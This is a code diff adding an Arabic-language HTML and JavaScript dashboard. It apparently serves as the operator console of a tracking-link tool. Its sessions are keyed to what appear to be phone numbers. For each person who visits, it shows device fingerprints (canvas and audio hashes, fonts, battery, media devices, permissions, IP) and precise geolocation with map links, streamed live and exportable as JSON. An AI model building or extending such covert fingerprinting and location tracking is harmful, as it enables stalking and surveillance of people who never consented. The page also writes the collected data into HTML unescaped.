@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ brand }} — لوحة التحكم</title>
+<link rel="stylesheet" href="/static/style.css">
+</head>
+<body class="dash">
+<header class="topbar">
+  <div class="brand"><div class="logo">◈</div><div class="bname">{{ brand }} Console</div></div>
+  <div class="tools">
+    <input id="key" placeholder="dashboard token" value="">
+    <button id="load">تحميل</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="list"><h2>الجلسات</h2><div id="sessions"></div></aside>
+  <main class="detail">
+    <div id="empty" class="empty">اختر جلسة لعرض البيانات الحيّة</div>
+    <div id="panel" hidden>
+      <div class="phead">
+        <div>
+          <div class="pnum" id="pnum" dir="ltr"></div>
+          <div class="pmeta" id="pmeta"></div>
+        </div>
+        <div class="pactions">
+          <a id="pexport" class="btn sm" href="#" target="_blank">تصدير JSON</a>
+          <a id="pmap" class="btn sm ghost" href="#" target="_blank">الخريطة</a>
+        </div>
+      </div>
+      <div class="cols">
+        <section><h3>البصمات</h3><div id="fps" class="feed"></div></section>
+        <section><h3>الأحداث</h3><div id="events" class="feed"></div></section>
+        <section><h3>المواقع</h3><div id="locs" class="feed"></div></section>
+      </div>
+    </div>
+  </main>
+</div>
+<script>
+const $ = (id) => document.getElementById(id);
+let current = null, es = null;
+
+function key() { return $("key").value.trim(); }
+function q() { return key() ? "?k=" + encodeURIComponent(key()) : ""; }
+
+async function loadSessions() {
+  const r = await fetch("/api/sessions" + q());
+  if (!r.ok) { $("sessions").innerHTML = "<p class='err'>توكن غير صحيح</p>"; return; }
+  const data = await r.json();
+  $("sessions").innerHTML = data.sessions.map(s => `
+    <div class="srow" data-t="${s.token}">
+      <div class="snum" dir="ltr">${s.number}</div>
+      <div class="smeta">${s.hits} زيارة · ${s.created_at}</div>
+    </div>`).join("") || "<p class='muted'>لا جلسات</p>";
+  document.querySelectorAll(".srow").forEach(el =>
+    el.onclick = () => openSession(el.dataset.t));
+}
+
+function row(title, value) {
+  if (value === undefined || value === null || value === "") return "";
+  return `<div class="kv"><b>${title}</b><span dir="ltr">${String(value).slice(0,300)}</span></div>`;
+}
+
+function renderFp(fp) {
+  const d = fp.data || {};
+  const parts = [
+    row("UA", d.ua), row("منصة", d.platform), row("شاشة", d.screen),
+    row("GPU", d.webgl_renderer), row("Canvas", d.canvas_hash),
+    row("Audio", d.audio_hash), row("خطوط", (d.fonts || []).join(", ")),
+    row("بطارية", d.battery), row("شبكة", d.connection), row("ذاكرة", d.device_memory),
+    row("أنوية", d.hardware_concurrency), row("لمس", d.max_touch_points),
+    row("منطقة زمنية", d.timezone), row("لغات", (d.languages || []).join(", ")),
+    row("كاميرات/مايك", d.media_devices), row("صلاحيات", d.permissions),
+    row("تخزين", d.storage), row("IP", fp.ip)
+  ].filter(Boolean).join("");
+  return `<div class="card2"><div class="ct">بصمة #${fp.id} · ${fp.ts}</div>${parts}</div>`;
+}
+
+function renderLoc(l) {
+  return `<div class="card2"><div class="ct">موقع #${l.id} · دقة ${Math.round(l.acc || 0)}م</div>
+    <div class="kv"><b>إحداثيات</b><span dir="ltr">${l.lat}, ${l.lon}</span></div>
+    <a class="btn sm" target="_blank" href="https://www.google.com/maps?q=${l.lat},${l.lon}">فتح الخريطة</a></div>`;
+}
+
+async function openSession(token) {
+  current = token;
+  if (es) es.close();
+  $("empty").hidden = true; $("panel").hidden = false;
+  const r = await fetch("/api/session/" + token + q());
+  if (!r.ok) return;
+  const b = await r.json();
+  $("pnum").textContent = b.session.number;
+  $("pmeta").textContent = `${b.session.hits} زيارة · ${b.session.created_at} · ${b.session.ip_first || "-"}`;
+  $("pexport").href = "/api/export/" + token + q();
+  $("fps").innerHTML = b.fingerprints.map(renderFp).join("") || "<p class='muted'>—</p>";
+  $("locs").innerHTML = b.locations.map(renderLoc).join("") || "<p class='muted'>—</p>";
+  $("events").innerHTML = b.events.map(e =>
+    `<div class="ev"><b>${e.kind}</b> <span class="muted">${e.ts}</span></div>`).join("");
+  if (b.locations.length) {
+    const l = b.locations[b.locations.length - 1];
+    $("pmap").href = `https://www.google.com/maps?q=${l.lat},${l.lon}`;
+  }
+  es = new EventSource("/api/stream/" + token + q());
+  es.onmessage = (m) => {
+    const e = JSON.parse(m.data);
+    $("events").insertAdjacentHTML("afterbegin",
+      `<div class="ev"><b>${e.kind}</b> <span class="muted">${e.ts}</span></div>`);
+    if (e.kind === "fingerprint") openSession(token);
+    if (e.kind === "location") {
+      const d = e.data || {};
+      $("locs").insertAdjacentHTML("afterbegin",
+        renderLoc({ id: e.id, ts: e.ts, lat: d.lat, lon: d.lon, acc: d.acc }));
+    }
+  };
+}
+
+$("load").onclick = loadSessions;
+$("key").onkeydown = (e) => { if (e.key === "Enter") loadSessions(); };
+loadSessions();
+</script>
+</body>
+</html>
